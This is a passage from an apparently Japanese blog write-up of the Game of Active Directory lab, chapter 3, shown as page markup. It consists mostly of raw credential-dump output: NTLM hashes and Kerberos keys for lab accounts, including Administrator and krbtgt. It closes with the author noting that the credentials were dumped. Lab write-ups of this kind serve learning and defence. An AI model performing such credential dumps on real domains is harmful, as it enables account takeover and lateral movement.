+drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
+sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+pnightmare:1121:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741:::
+BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:0d8d114e49ff85a35b3c97208d88dcf3:::
+gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:563b455a419089dfbfa829cab9f2b174:::
+removemiccomputer$:1120:aad3b435b51404eeaad3b435b51404ee:1e986d18a9b7c9543e2d57944e8656b7:::
+SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:743ab45cdf64d2f368f501fd348ab3d8:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7fe27604209f1b09a5e6b65dc787322c276ad68b6f8c4d031330ba1d2cf92e0a
+Administrator:aes128-cts-hmac-sha1-96:ae2bd7bb7370fab76dbce7574775785d
+Administrator:des-cbc-md5:c43b5d5e049e5dc4
+krbtgt:aes256-cts-hmac-sha1-96:cbaf94c62ef0df4e9aca570d91669ef363202474c280c40a32356d1fe43d2936
+krbtgt:aes128-cts-hmac-sha1-96:d3772f8394664311fa4f2aa721604b98
+krbtgt:des-cbc-md5:074ae0d549492af7
+daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
+daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
+daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
+essos.local\viserys.targaryen:aes256-cts-hmac-sha1-96:2b64ffb14425909795d5c1bfecf9ff2a55423bdfbf2b7b33aece337c6f180950
+essos.local\viserys.targaryen:aes128-cts-hmac-sha1-96:d96686a26adc498b3409d97241cc7112
+essos.local\viserys.targaryen:des-cbc-md5:1ab38c86518c2a97
+khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
+khal.drogo:des-cbc-md5:b5ec4c1032ef020d
+jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
+jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
+jorah.mormont:des-cbc-md5:b926916289464ffb
+missandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1c
+missandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377a
+missandei:des-cbc-md5:54ec15a8c8e6f44f
+drogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1
+drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814
+drogon:des-cbc-md5:bf1c85a7c8fdf237
+sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
+sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
+sql_svc:des-cbc-md5:91d6b0df31b52a3d
+pnightmare:aes256-cts-hmac-sha1-96:08da34ebff1dd974ef4694a80381ba0b91053db8c1ff3408c49b1ec870a355ae
+pnightmare:aes128-cts-hmac-sha1-96:1e52001e6c4555756489ac2632ff1920
+pnightmare:des-cbc-md5:5ef4f1d368f476ab
+MEEREEN$:aes256-cts-hmac-sha1-96:c2ba7282441e5fab1d0937a079b8d16fe707635b3dc418eecc1dcfec0b678f7e
+MEEREEN$:aes128-cts-hmac-sha1-96:61f0538c8597abbd7af90fe4b4734eb8
+MEEREEN$:des-cbc-md5:7c15d3bfb06b8302
+BRAAVOS$:aes256-cts-hmac-sha1-96:2a38c6d026c43cc520f37c5fa68c99563351418cb96bcf2131bfeb8077c4681c
+BRAAVOS$:aes128-cts-hmac-sha1-96:7997ad6ca029027905198cdc9b0fb3ed
+BRAAVOS$:des-cbc-md5:c17a85c823794acb
+gmsaDragon$:aes256-cts-hmac-sha1-96:b073af95cf4be2fed876f5d301b2db7ac07b60d9973a3877f4c36af32d2901d8
+gmsaDragon$:aes128-cts-hmac-sha1-96:92983daf8288a8ae5a75a6d231f0b442
+gmsaDragon$:des-cbc-md5:267c20ce62405ed5
+removemiccomputer$:aes256-cts-hmac-sha1-96:8f6354675bc4054f4fd28efa73e3d37239a6f8bb38985c2317050e8c4d45c958
+removemiccomputer$:aes128-cts-hmac-sha1-96:2b1e79379afb5995ded695e06e042d3f
+removemiccomputer$:des-cbc-md5:c1e0f47c20e3d307
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:76c85f04bb423f39eb02246748da52eb85f4883dfa6f75b039fe84c1e632d070
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:34cc6de4b34d71da64939577e88a41e4
+SEVENKINGDOMS$:des-cbc-md5:34dc49029dd96179
+[*] Cleaning up...
+</code></pre><p>クレデンシャルダンプした
+今回はこれで終わり</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=http://localhost:1313/posts/goad_writeupch2/><span class=title>Next »</span><br><span>GOAD Writeup Ch2</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on x" href="https://x.com/intent/tweet/?text=GOAD%20Writeup%20Ch3&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f&amp;title=GOAD%20Writeup%20Ch3&amp;summary=GOAD%20Writeup%20Ch3&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f&title=GOAD%20Writeup%20Ch3"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on whatsapp" href="https://api.whatsapp.com/send?text=GOAD%20Writeup%20Ch3%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on telegram" href="https://telegram.me/share/url?text=GOAD%20Writeup%20Ch3&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share GOAD Writeup Ch3 on ycombinator" href="https://news.ycombinator.com/submitlink?t=GOAD%20Writeup%20Ch3&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fgoad_writeupch3%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>x64.moe</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
